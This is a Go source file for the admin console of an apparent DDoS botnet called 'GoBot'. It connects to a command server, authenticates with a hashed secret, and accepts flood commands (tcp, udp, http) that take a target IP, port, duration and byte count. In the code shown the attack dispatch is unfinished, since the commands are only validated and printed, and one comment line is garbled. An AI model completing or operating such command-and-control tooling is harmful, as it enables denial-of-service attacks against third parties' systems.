package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/joho/godotenv"
)

var (
	broadcast = make(chan string) // Channel for broadcasting messages
	conn      net.Conn
)

func hashMessage(message string) string {
	// Create a new SHA-256 hash object
	hash := sha256.New()
	// Write the input data to the hash object
	hash.Write([]byte(message))
	// Get the resulting hash as a byte slice
	hashBytes := hash.Sum(nil)
	// Convert the hash to a hexadecimal string
	hashString := hex.EncodeToString(hashBytes)

	return hashString
}

func validateAttackParameters(parameters []string) error {
	if len(parameters) != 5 {
		return fmt.Errorf("Custom error: %s", "not enough parameters")
	}

	_, err := strconv.Atoi(parameters[3])
	if err != nil {
		return fmt.Errorf("failed to convert secs to integer: %v", err)
	}

	_, err = strconv.Atoi(parameters[4])
	if err != nil {
		return fmt.Errorf("failed to convert bytes to integer: %v", err)
	}

	return nil
}

func sendMessage() {
	for {
		message := <-broadcast
		//message = hashMessage(message)
		_, err := conn.Write([]byte(message)) //Sends message to clients
		if err != nil {
			fmt.Println("Error broadcasting data:", err)
			fmt.Println("Exiting the Admin Panel.")
			close(broadcast)
			os.Exit(0)
		}
	}
}

func main() {
	// Load variables from .env file
	err := godotenv.Load()
	if err != nil {
		fmt.Println("Error loading .env file:", err)
		return
	}

	// Access environment variables
	SECRET := os.Getenv("SECRET")
	//dbPort := os.Getenv("DB_PORT")

	fmt.Println("Database Host:", SECRET)
	//fmt.Println("DatabaclientSecret := credentials[1]se Port:", dbPort)

	//Connect to the server
	serverAddr := "127.0.0.1:8080"

	go sendMessage()

	go func() {
		for {
			fmt.Print("GoBot> ")
			reader := bufio.NewReader(os.Stdin)
			command, _ := reader.ReadString('\n')
			command = strings.TrimRight(command, "\n")
			parameters := strings.Split(command, " ")

			switch parameters[0] {
			// Check if the user wants to exit
			case "exit":
				fmt.Println("Exiting server.")
				close(broadcast)
				os.Exit(0)

			case "attacks":
				fmt.Println("	tcp ip port secs bytes")

			case "?", "help":
				fmt.Println("	attacks: shows all the possible attacks")
				fmt.Println("	command 2")
				fmt.Println("	command 3")
				fmt.Println("	command 4")

			case "show":
				fmt.Printf("Number of connected clients: %v\n", 0)
				_, err := conn.Write([]byte("show")) //Sends message to clients
				if err != nil {
					fmt.Println("Error broadcasting data:", err)
					continue
				}

			case "tcp", "udp", "http":
				err = validateAttackParameters(parameters)
				if err != nil {
					fmt.Println("attack not validated", err)
					continue
				}
				fmt.Println(parameters)
			case "":
				continue

			default:
				//broadcast <- command //Takes the command and sends in to the channel
				fmt.Println("Unknown command")
				//so that its broadcasted to the clients
			}
		}

	}()

	for {

		if conn == nil {

			newConn, err := net.Dial("tcp", serverAddr)
			if err != nil {
				fmt.Println("Error connecting to the server:", err)
				time.Sleep(time.Second) // Wait before attempting to reconnect
				continue
			}

			fmt.Println("Connected to the server")
			conn = newConn
			defer conn.Close()

			// Send client type identifier to the server
			_, err = conn.Write([]byte("admin/"))
			if err != nil {
				fmt.Println("Error sending client type:", err)
				return
			}
			//TODO: como admin mandar un mensaje de autenticación

			_, err = conn.Write([]byte(hashMessage(SECRET)))
			if err != nil {
				fmt.Println("Error sending:", err)
				return
			}
		}

	}

}
